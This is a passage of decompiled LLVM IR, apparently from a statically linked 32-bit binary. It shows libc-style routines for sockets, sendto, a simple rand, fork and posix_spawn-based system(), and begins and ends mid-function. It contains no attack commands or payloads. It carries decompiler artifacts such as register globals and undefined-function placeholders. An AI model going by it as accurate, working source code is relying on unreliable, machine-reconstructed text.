  uselistorder i32 %v1_804c9a5, { 0, 7, 8, 6, 5, 3, 1, 2, 4 }
  uselistorder i32 %v0_804cbe9, { 2, 1, 0 }
  uselistorder i32 %v6_804cbe4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804cbaf, { 1, 0, 3, 2 }
  uselistorder i32 %v3_804cb9a, { 1, 0, 2 }
  uselistorder i32 %v0_804cb9a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804cb78, { 1, 0 }
  uselistorder i32 %v5_804cb72, { 1, 0 }
  uselistorder i32 %v0_804cb6b.pre, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804cb5e, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804cb0e, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 14, 13, 12, 11, 10, 15 }
  uselistorder i32 %v7_804cab9, { 1, 0 }
  uselistorder i32 %v6_804cab3, { 1, 0 }
  uselistorder i32 %v5_804caa5, { 0, 2, 1 }
  uselistorder i32 %v1_804caa1, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32* %v3_804caa5, { 1, 0 }
  uselistorder i32 %v17_804cb0a, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 11, 10 }
  uselistorder i32 %v0_804ca7d, { 1, 0 }
  uselistorder i32 %v5_804ca61, { 1, 0 }
  uselistorder i32 %v3_804ca5d, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_804ca5d, { 0, 6, 5, 4, 3, 2, 1, 7, 8 }
  uselistorder i32 %v1_804ca14, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_804ca08.lcssa, { 1, 0 }
  uselistorder i32 %v5_804c9ff, { 1, 0 }
  uselistorder i32 %v1_804c9fe, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804c9ff32, { 1, 2, 0 }
  uselistorder i32 %v5_804c9f8, { 1, 0 }
  uselistorder i32 %v0_804c9f8.pre, { 2, 1, 0 }
  uselistorder i32 %v6_804c9f0, { 1, 0 }
  uselistorder i32 %v1_804c9c4, { 1, 0 }
  uselistorder i32 %v1_804c9be102, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 1, 2, 3 }
  uselistorder i32 %v5_804c9f892, { 1, 0 }
  uselistorder i32 %v0_804ca08115, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v5_804c9ff106, { 1, 0 }
  uselistorder i32 %v2_804c970, { 1, 0 }
  uselistorder i32 %v2_804c935, { 1, 0 }
  uselistorder i32 %v1_804c92d, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v5_804c927, { 1, 0 }
  uselistorder i32 %v1_804c924, { 1, 0 }
  uselistorder i32 %v1_804c923, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804c927.pre, { 0, 2, 1 }
  uselistorder i32 %v0_804c8db172, { 1, 0 }
  uselistorder i32 %v1_804c8e2173, { 1, 4, 3, 2, 0 }
  uselistorder i32 %v0_804c862, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804c84c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_804c7cc, { 1, 0 }
  uselistorder i32 %v0_804c790, { 5, 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_804c78b, { 0, 2, 1 }
  uselistorder i32 %v1_804c77f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_804c774, { 1, 0 }
  uselistorder i32 %v0_804c774, { 0, 2, 1 }
  uselistorder i32 %v2_804c738, { 1, 0 }
  uselistorder i32 %v6_804c722, { 1, 0 }
  uselistorder i32 %v0_804c6b3, { 10, 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 9, 12 }
  uselistorder i32 %v1_804c697, { 1, 2, 0 }
  uselistorder i32 %v2_804c68f, { 1, 0 }
  uselistorder i8 %v2_804c689186, { 2, 1, 0 }
  uselistorder i32 %v1_804c688, { 0, 2, 1 }
  uselistorder i32 %v0_804c673, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v4_804c604, { 1, 0, 2 }
  uselistorder i32 %v0_804c5e2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v3_804c5c4, { 1, 0 }
  uselistorder i32 %v0_804c584, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_804c54c, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v15_804c4ac, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 11, 12, 13, 4, 2, 1, 3, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 28, 29 }
  uselistorder i32* %ecx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 30, 31, 35, 17, 18, 19, 4, 5, 6, 7, 116, 8, 9, 10, 11, 12, 13, 14, 15, 16, 20, 21, 22, 28, 23, 24, 25, 26, 27, 29, 32, 33, 34, 36, 37, 38, 45, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 104, 105, 83, 62, 63, 64, 65, 66, 71, 67, 68, 69, 70, 72, 73, 74, 75, 76, 77, 78, 0, 79, 80, 81, 82, 84, 101, 86, 85, 87, 88, 89, 90, 95, 96, 91, 92, 93, 94, 97, 99, 98, 100, 102, 103, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115 }
  uselistorder i32 (i32)* @__fclose_ca, { 1, 0 }
  uselistorder i32 732, { 1, 0 }
  uselistorder i32 724, { 1, 2, 0 }
  uselistorder i32 728, { 1, 0 }
  uselistorder i32 ()* @mtime, { 1, 0 }
  uselistorder i32 736, { 1, 2, 3, 4, 0 }
  uselistorder i32 720, { 3, 4, 0, 5, 6, 1, 2 }
  uselistorder i32 ()* @setsockopt, { 0, 3, 2, 1 }
  uselistorder i32 -24, { 2, 1, 0, 6, 7, 3, 4, 5 }
  uselistorder i32 -20, { 2, 1, 0, 6, 3, 4, 5 }
  uselistorder i32 5000, { 9, 4, 5, 6, 0, 3, 2, 8, 7, 1 }
  uselistorder i32 636, { 1, 0, 2, 3 }
  uselistorder i32 460, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, i32)* @fgets, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i16)* @htons, { 2, 3, 4, 0, 1 }
  uselistorder i32 544, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @strtoul, { 2, 1, 0 }
  uselistorder i32 708, { 4, 2, 0, 3, 1 }
  uselistorder i32 ()* @strncmp, { 1, 0 }
  uselistorder label %dec_label_pc_804cbfd, { 1, 0 }
  uselistorder label %dec_label_pc_804cba7, { 2, 8, 3, 4, 0, 5, 6, 7, 1, 9 }
  uselistorder label %dec_label_pc_804cb78, { 1, 0 }
  uselistorder label %dec_label_pc_804cac9, { 1, 0 }
  uselistorder label %dec_label_pc_804caae, { 1, 0 }
  uselistorder label %dec_label_pc_804ca5d, { 1, 0 }
  uselistorder label %dec_label_pc_804ca14, { 1, 0 }
  uselistorder label %dec_label_pc_804c9fe, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c9be, { 1, 0 }
  uselistorder label %dec_label_pc_804c9ad, { 1, 0 }
  uselistorder label %dec_label_pc_804c92d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c923, { 1, 0 }
  uselistorder label %dec_label_pc_804c8db, { 1, 0 }
  uselistorder label %dec_label_pc_804c841, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c7bd, { 1, 0 }
  uselistorder label %dec_label_pc_804c77f, { 1, 0 }
  uselistorder label %dec_label_pc_804c774, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804c771, { 1, 0 }
  uselistorder label %dec_label_pc_804c69f, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c68f, { 1, 0 }
  uselistorder label %dec_label_pc_804c674, { 1, 0 }
  uselistorder label %dec_label_pc_804c631, { 6, 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_804c5ce, { 4, 0, 1, 2, 3 }
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v6_804cc6b = call i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 0, i32 0)
  ret i32 %v6_804cc6b

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 2, 1, 0, 3 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804cca7 = ptrtoint i32* %stack_var_-24 to i32
  %v7_804ccb9 = call i32 @__syscall_cp(i32 102, i32 11, i32 %v2_804cca7, i32 0, i32 0, i32 0, i32 0)
  %v1_804ccc2 = call i32 @__syscall_ret(i32 %v7_804ccb9)
  ret i32 %v1_804ccc2

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @setsockopt() local_unnamed_addr {
entry:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 14, i32* @edx, align 4
  store i32 102, i32* @eax, align 4
  %v1_804cd0d = call i32 @__vsyscall(i32 %tmp9)
  %v1_804cd16 = call i32 @__syscall_ret(i32 %v1_804cd0d)
  ret i32 %v1_804cd16
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cd21 = load i32, i32* @edi, align 4
  store i32 1, i32* %esi.global-to-local, align 4
  %v0_804cd28 = load i32, i32* @ebx, align 4
  store i32 %v0_804cd28, i32* %stack_var_-16, align 4
  store i32 102, i32* @ebx, align 4
  %v2_804cd35 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804cd35, i32* @ecx, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  store i32 102, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  %v1_804cd69 = call i32 @__vsyscall(i32 %arg1)
  store i32 %v1_804cd69, i32* %stack_var_-92, align 4
  %v1_804cd72 = call i32 @__syscall_ret(i32 %v1_804cd69)
  %v2_804cd7a = icmp slt i32 %v1_804cd72, 0
  store i32 %v1_804cd72, i32* %edi.global-to-local, align 4
  %v1_804cd7e = icmp eq i1 %v2_804cd7a, false
  br i1 %v1_804cd7e, label %dec_label_pc_804ce35, label %dec_label_pc_804cd84

dec_label_pc_804cd84:                             ; preds = %entry
  %v0_804cd84 = load i32, i32* %stack_var_-92, align 4
  %v1_804cd84 = call i32 @__errno_location(i32 %v0_804cd84)
  %v1_804cd89 = inttoptr i32 %v1_804cd84 to i32*
  %v2_804cd89 = load i32, i32* %v1_804cd89, align 4
  %v11_804cd89 = icmp eq i32 %v2_804cd89, 22
  br i1 %v11_804cd89, label %dec_label_pc_804cd9c, label %dec_label_pc_804cd8e

dec_label_pc_804cd8e:                             ; preds = %dec_label_pc_804cd84
  %v0_804cd8e = load i32, i32* %stack_var_-92, align 4
  %v1_804cd8e = call i32 @__errno_location(i32 %v0_804cd8e)
  %v1_804cd93 = inttoptr i32 %v1_804cd8e to i32*
  %v2_804cd93 = load i32, i32* %v1_804cd93, align 4
  %v11_804cd93 = icmp eq i32 %v2_804cd93, 93
  %v1_804cd96 = icmp eq i1 %v11_804cd93, false
  br i1 %v1_804cd96, label %dec_label_pc_804ce35, label %dec_label_pc_804cd9c

dec_label_pc_804cd9c:                             ; preds = %dec_label_pc_804cd8e, %dec_label_pc_804cd84
  %v0_804cd9c = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cd9c = and i32 %v0_804cd9c, 526336
  %v2_804cd9c = icmp eq i32 %v1_804cd9c, 0
  br i1 %v2_804cd9c, label %dec_label_pc_804ce35, label %dec_label_pc_804cda8

dec_label_pc_804cda8:                             ; preds = %dec_label_pc_804cd9c
  store i32 %arg1, i32* @edi, align 4
  %v0_804cdae = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804cdae, i32* @edx, align 4
  %v2_804cdbd = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804cdbd, i32* @ecx, align 4
  store i32 %arg1, i32* %stack_var_-64, align 4
  %v0_804cdd9 = load i32, i32* @ebx, align 4
  store i32 %v0_804cdd9, i32* @eax, align 4
  %v1_804cde3 = call i32 @__vsyscall(i32 %arg1)
  store i32 %v1_804cde3, i32* %stack_var_-92, align 4
  %v1_804cdec = call i32 @__syscall_ret(i32 %v1_804cde3)
  store i32 %v1_804cdec, i32* @edx, align 4
  %v2_804cdf6 = icmp slt i32 %v1_804cdec, 0
  br i1 %v2_804cdf6, label %dec_label_pc_804ce37, label %dec_label_pc_804cdfa

dec_label_pc_804cdfa:                             ; preds = %dec_label_pc_804cda8
  %v0_804cdfa = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cdfa = and i32 %v0_804cdfa, 524288
  %v2_804cdfa = icmp eq i32 %v1_804cdfa, 0
  br i1 %v2_804cdfa, label %dec_label_pc_804ce13, label %dec_label_pc_804ce02

dec_label_pc_804ce02:                             ; preds = %dec_label_pc_804cdfa
  store i32 221, i32* @eax, align 4
  store i32 2, i32* @ecx, align 4
  %v0_804ce0c = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804ce0c, i32* @edi, align 4
  %v0_804ce0e = load i32, i32* %stack_var_-92, align 4
  %v1_804ce0e = call i32 @__vsyscall(i32 %v0_804ce0e)
  %v0_804ce13.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ce13

dec_label_pc_804ce13:                             ; preds = %dec_label_pc_804cdfa, %dec_label_pc_804ce02
  %v0_804ce13 = phi i32 [ %v0_804cdfa, %dec_label_pc_804cdfa ], [ %v0_804ce13.pre, %dec_label_pc_804ce02 ]
  %v1_804ce13 = and i32 %v0_804ce13, 2048
  %v2_804ce13 = icmp eq i32 %v1_804ce13, 0
  store i32 %v1_804ce13, i32* %ebp.global-to-local, align 4
  br i1 %v2_804ce13, label %dec_label_pc_804ce37, label %dec_label_pc_804ce1d

dec_label_pc_804ce1d:                             ; preds = %dec_label_pc_804ce13
  store i32 221, i32* @eax, align 4
  store i32 4, i32* @ecx, align 4
  store i32 2048, i32* @edi, align 4
  %v0_804ce2c = load i32, i32* %stack_var_-92, align 4
  %v1_804ce2c = call i32 @__vsyscall(i32 %v0_804ce2c)
  br label %dec_label_pc_804ce37

dec_label_pc_804ce35:                             ; preds = %dec_label_pc_804cd9c, %dec_label_pc_804cd8e, %entry
  %v0_804ce35 = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ce37

dec_label_pc_804ce37:                             ; preds = %dec_label_pc_804ce13, %dec_label_pc_804cda8, %dec_label_pc_804ce1d, %dec_label_pc_804ce35
  %v0_804ce3e = phi i32 [ %v1_804cdec, %dec_label_pc_804ce13 ], [ %v1_804cdec, %dec_label_pc_804cda8 ], [ %v1_804cdec, %dec_label_pc_804ce1d ], [ %v0_804ce35, %dec_label_pc_804ce35 ]
  %v2_804ce3a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ce3a, i32* @ebx, align 4
  store i32 %v0_804cd21, i32* @edi, align 4
  ret i32 %v0_804ce3e

; uselistorder directives
  uselistorder i32 %v1_804cdec, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804cde3, { 1, 0 }
  uselistorder i32 %v1_804cd69, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0, 4, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_804ce37, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804ce13, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  store i64 0, i64* @global_var_8056ddc.358, align 8
  %v1_804ce4e = add i32 %arg1, -1
  %v1_804ce4f = sext i32 %v1_804ce4e to i64
  store i64 %v1_804ce4f, i64* @global_var_8056dd8.359, align 8
  ret i32 %v1_804ce4e
}

define i32 @rand(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804ce55 = load i64, i64* @global_var_8056dd8.359, align 8
  %v4_804ce55 = mul nsw i64 %v1_804ce55, 1481765933
  %v5_804ce55 = trunc i64 %v4_804ce55 to i32
  %v1_804ce5f = load i64, i64* @global_var_8056ddc.358, align 8
  %v4_804ce5f = mul nsw i64 %v1_804ce5f, 1284865837
  %v5_804ce5f = trunc i64 %v4_804ce5f to i32
  %v2_804ce69 = add i32 %v5_804ce5f, %v5_804ce55
  %v5_804ce70 = mul nuw i64 %v1_804ce55, 1284865837
  %v6_804ce70 = trunc i64 %v5_804ce70 to i32
  %v7_804ce70 = udiv i64 %v5_804ce70, 4294967296
  %v8_804ce70 = trunc i64 %v7_804ce70 to i32
  %v1_804ce76 = add i32 %v6_804ce70, 1
  %v5_804ce76 = icmp eq i32 %v6_804ce70, -1
  %v2_804ce79 = add i32 %v2_804ce69, %v8_804ce70
  %v2_804ce7c = zext i1 %v5_804ce76 to i32
  %v3_804ce7c = add i32 %v2_804ce79, %v2_804ce7c
  %v1_804ce7f = sext i32 %v1_804ce76 to i64
  store i64 %v1_804ce7f, i64* @global_var_8056dd8.359, align 8
  %v1_804ce86 = sext i32 %v3_804ce7c to i64
  store i64 %v1_804ce86, i64* @global_var_8056ddc.358, align 8
  %v2_804ce8c = udiv i32 %v3_804ce7c, 2
  ret i32 %v2_804ce8c

; uselistorder directives
  uselistorder i32 %v6_804ce70, { 1, 0 }
  uselistorder i64* @global_var_8056ddc.358, { 2, 1, 0 }
  uselistorder i64 0, { 1, 0, 2, 3 }
  uselistorder i64* @global_var_8056dd8.359, { 2, 1, 0 }
}

define i32 @dummy.4(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804ce94 = load i32, i32* @eax, align 4
  ret i32 %v0_804ce94
}

define i32 @fork() local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ce95 = load i32, i32* @esi, align 4
  %v0_804ce96 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce96, i32* %stack_var_-8, align 4
  %v1_804ce9f = call i32 @dummy.4(i32 -1)
  %v2_804cea5 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_804cea5, i32* @esi, align 4
  %v1_804ceaa = call i32 @__block_all_sigs(i32 %v2_804cea5)
  store i32 2, i32* @eax, align 4
  %v1_804ceb4 = call i32 @__vsyscall(i32 %v2_804cea5)
  %v1_804cebc = call i32 @__syscall_ret(i32 %v1_804ceb4)
  %v1_804cec4 = icmp eq i32 %v1_804cebc, 0
  store i32 %v1_804cebc, i32* @ebx, align 4
  %v1_804cec8 = icmp eq i1 %v1_804cec4, false
  br i1 %v1_804cec8, label %dec_label_pc_804cefc, label %dec_label_pc_804ceca

dec_label_pc_804ceca:                             ; preds = %entry
  call void @llvm.trap()
  unreachable

dec_label_pc_804cefc:                             ; preds = %entry
  %v1_804cf00 = call i32 @__restore_sigs(i32 %v2_804cea5)
  store i32 0, i32* @eax, align 4
  %v1_804cf0f = call i32 @dummy.4(i32 0)
  %v2_804cf1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804cf1c, i32* @ebx, align 4
  store i32 %v0_804ce95, i32* @esi, align 4
  ret i32 %v1_804cebc

; uselistorder directives
  uselistorder i32 %v2_804cea5, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @dummy.4, { 1, 0 }
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_-1052 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-716 = alloca i32, align 4
  %stack_var_-576 = alloca i32, align 4
  %stack_var_-1084 = alloca i32, align 4
  %stack_var_-436 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cf20 = load i32, i32* @ebp, align 4
  %v0_804cf21 = load i32, i32* @edi, align 4
  %v0_804cf22 = load i32, i32* @esi, align 4
  %v0_804cf23 = load i32, i32* @ebx, align 4
  store i32 %v0_804cf23, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebp, align 4
  %v2_804cf31 = ptrtoint i32* %stack_var_-436 to i32
  store i32 %v2_804cf31, i32* @ebx, align 4
  store i32 %v2_804cf31, i32* %stack_var_-1084, align 4
  %v3_804cf41 = bitcast i32* %stack_var_-436 to i8*
  %v4_804cf41 = call i32 @memset(i8* %v3_804cf41, i32 0, i32 140)
  store i32 %v4_804cf41, i32* @eax, align 4
  store i32 1, i32* %stack_var_-436, align 4
  store i32 32512, i32* %stack_var_-24, align 4
  %v1_804cf5c = call i32 @__pthread_testcancel(i32 1)
  %v1_804cf64 = icmp eq i32 %arg1, 0
  br i1 %v1_804cf64, label %dec_label_pc_804d0f7, label %dec_label_pc_804cf71

dec_label_pc_804cf71:                             ; preds = %entry
  %v2_804cf72 = ptrtoint i32* %stack_var_-576 to i32
  store i32 2, i32* %stack_var_-1084, align 4
  %v3_804cf7d = call i32 @__sigaction(i32 2, i32 %v2_804cf31, i32 %v2_804cf72)
  %v2_804cf85 = ptrtoint i32* %stack_var_-716 to i32
  store i32 3, i32* %stack_var_-1084, align 4
  %v3_804cf90 = call i32 @__sigaction(i32 3, i32 %v2_804cf31, i32 %v2_804cf85)
  %v2_804cf99 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_804cf99, i32* @ebx, align 4
  store i32 %v2_804cf99, i32* %stack_var_-1084, align 4
  %v2_804cfa1 = call i32 @sigaddset(i32 %v2_804cf99, i32 17)
  %v2_804cfa9 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_804cfa9, i32* @edi, align 4
  store i32 0, i32* %stack_var_-1084, align 4
  %v3_804cfb4 = call i32 @sigprocmask(i32 0, i32 %v2_804cf99, i32 %v2_804cfa9)
  %v2_804cfba = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_804cfba, i32* %stack_var_-1084, align 4
  %v2_804cfc2 = call i32 @sigemptyset(i32* nonnull %stack_var_-296)
  %v3_804cfca = load i32, i32* %stack_var_-576, align 4
  %v12_804cfca = icmp eq i32 %v3_804cfca, 1
  br i1 %v12_804cfca, label %dec_label_pc_804cfe1, label %dec_label_pc_804cfd4

dec_label_pc_804cfd4:                             ; preds = %dec_label_pc_804cf71
  store i32 %v2_804cfba, i32* %stack_var_-1084, align 4
  %v2_804cfd9 = call i32 @sigaddset(i32 %v2_804cfba, i32 2)
  br label %dec_label_pc_804cfe1

dec_label_pc_804cfe1:                             ; preds = %dec_label_pc_804cf71, %dec_label_pc_804cfd4
  %v3_804cfe1 = load i32, i32* %stack_var_-716, align 4
  %v12_804cfe1 = icmp eq i32 %v3_804cfe1, 1
  br i1 %v12_804cfe1, label %dec_label_pc_804cff8, label %dec_label_pc_804cfeb

dec_label_pc_804cfeb:                             ; preds = %dec_label_pc_804cfe1
  store i32 %v2_804cfba, i32* %stack_var_-1084, align 4
  %v2_804cff0 = call i32 @sigaddset(i32 %v2_804cfba, i32 3)
  br label %dec_label_pc_804cff8

dec_label_pc_804cff8:                             ; preds = %dec_label_pc_804cfe1, %dec_label_pc_804cfeb
  %v2_804cffb = ptrtoint i32* %stack_var_-1052 to i32
  store i32 %v2_804cffb, i32* @ebx, align 4
  store i32 %v2_804cffb, i32* %stack_var_-1084, align 4
  %v1_804d000 = call i32 @posix_spawnattr_init(i32 %v2_804cffb)
  store i32 %v2_804cffb, i32* %stack_var_-1084, align 4
  %v2_804d009 = call i32 @posix_spawnattr_setsigmask(i32 %v2_804cffb, i32 %v2_804cfa9)
  store i32 %v2_804cffb, i32* %stack_var_-1084, align 4
  %v2_804d012 = call i32 @posix_spawnattr_setsigdefault(i32 %v2_804cffb, i32 %v2_804cfba)
  %v2_804d017 = load i32, i32* %stack_var_-1084, align 4
  store i32 %v2_804d017, i32* @edi, align 4
  store i32 %v2_804cffb, i32* %stack_var_-1084, align 4
  %v3_804d01c = call i32 @posix_spawnattr_setflags(i32* nonnull %stack_var_-1052, i32 12)
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80545a4.360, i32 0, i32 0), i8** %stack_var_-40, align 4
  store i32 12, i32* @esi, align 4
  %v0_804d04b = load i32, i32* @global_var_8056e04.320, align 4
  %v2_804d051 = ptrtoint i8** %stack_var_-40 to i32
  store i32 %v2_804d051, i32* %stack_var_-1084, align 4
  %v2_804d061 = ptrtoint i32* %stack_var_-20 to i32
  %v7_804d069 = call i32 @posix_spawn(i32 %v2_804d061, i32 ptrtoint ([8 x i8]* @global_var_805459f.362 to i32), i32 0, i32 %v2_804cffb, i32 %v2_804d051, i32 %v0_804d04b)
  store i32 %v2_804cffb, i32* %stack_var_-1084, align 4
  store i32 %v7_804d069, i32* @esi, align 4
  %v1_804d074 = call i32 @posix_spawnattr_destroy(i32 %v2_804cffb)
  %v1_804d07c = icmp eq i32 %v7_804d069, 0
  %v1_804d07e = icmp eq i1 %v1_804d07c, false
  br i1 %v1_804d07e, label %dec_label_pc_804d0a8, label %dec_label_pc_804d080

dec_label_pc_804d080:                             ; preds = %dec_label_pc_804cff8
  %v2_804d080 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d080, i32* @ebx, align 4
  br label %dec_label_pc_804d087

dec_label_pc_804d087:                             ; preds = %dec_label_pc_804d09e, %dec_label_pc_804d080
  %v0_804d087 = load i32, i32* @edx, align 4
  %v3_804d08b = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d08b, i32* %stack_var_-1084, align 4
  %v4_804d092 = call i32 @waitpid(i32 %v3_804d08b, i32 %v2_804d080, i32 0, i32 %v0_804d087)
  %v2_804d09a = icmp slt i32 %v4_804d092, 0
  %v1_804d09c = icmp eq i1 %v2_804d09a, false
  br i1 %v1_804d09c, label %dec_label_pc_804d0a8, label %dec_label_pc_804d09e

dec_label_pc_804d09e:                             ; preds = %dec_label_pc_804d087
  %v0_804d09e = load i32, i32* %stack_var_-1084, align 4
  %v1_804d09e = call i32 @__errno_location(i32 %v0_804d09e)
  %v1_804d0a3 = inttoptr i32 %v1_804d09e to i32*
  %v2_804d0a3 = load i32, i32* %v1_804d0a3, align 4
  %v11_804d0a3 = icmp eq i32 %v2_804d0a3, 4
  br i1 %v11_804d0a3, label %dec_label_pc_804d087, label %dec_label_pc_804d0a8

dec_label_pc_804d0a8:                             ; preds = %dec_label_pc_804d09e, %dec_label_pc_804d087, %dec_label_pc_804cff8
  store i32 2, i32* %stack_var_-1084, align 4
  %v3_804d0b5 = call i32 @__sigaction(i32 2, i32 %v2_804cf72, i32 0)
  store i32 3, i32* %stack_var_-1084, align 4
  %v3_804d0c9 = call i32 @__sigaction(i32 3, i32 %v2_804cf85, i32 0)
  store i32 2, i32* %stack_var_-1084, align 4
  %v3_804d0dd = call i32 @sigprocmask(i32 2, i32 %v2_804cfa9, i32 0)
  br i1 %v1_804d07c, label %dec_label_pc_804d0f0, label %dec_label_pc_804d0e9

dec_label_pc_804d0e9:                             ; preds = %dec_label_pc_804d0a8
  %v0_804d0e9 = load i32, i32* %stack_var_-1084, align 4
  %v1_804d0e9 = call i32 @__errno_location(i32 %v0_804d0e9)
  %v2_804d0ee = inttoptr i32 %v1_804d0e9 to i32*
  store i32 %v7_804d069, i32* %v2_804d0ee, align 4
  br label %dec_label_pc_804d0f0

dec_label_pc_804d0f0:                             ; preds = %dec_label_pc_804d0a8, %dec_label_pc_804d0e9
  %v3_804d0f0 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_804d0f7

dec_label_pc_804d0f7:                             ; preds = %entry, %dec_label_pc_804d0f0
  %v0_804d101 = phi i32 [ 1, %entry ], [ %v3_804d0f0, %dec_label_pc_804d0f0 ]
  %v2_804d0fd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d0fd, i32* @ebx, align 4
  store i32 %v0_804cf22, i32* @esi, align 4
  store i32 %v0_804cf21, i32* @edi, align 4
  store i32 %v0_804cf20, i32* @ebp, align 4
  ret i32 %v0_804d101

; uselistorder directives
  uselistorder i1 %v1_804d07c, { 1, 0 }
  uselistorder i32 %v7_804d069, { 2, 1, 0 }
  uselistorder i32 %v2_804cffb, { 2, 1, 0, 3, 5, 4, 7, 6, 9, 8, 10 }
  uselistorder i32 %v2_804cfba, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 %v2_804cfa9, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804cf99, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804cf85, { 1, 0 }
  uselistorder i32 %v2_804cf72, { 1, 0 }
  uselistorder i32* %stack_var_-436, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1084, { 0, 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @sigprocmask, { 1, 0 }
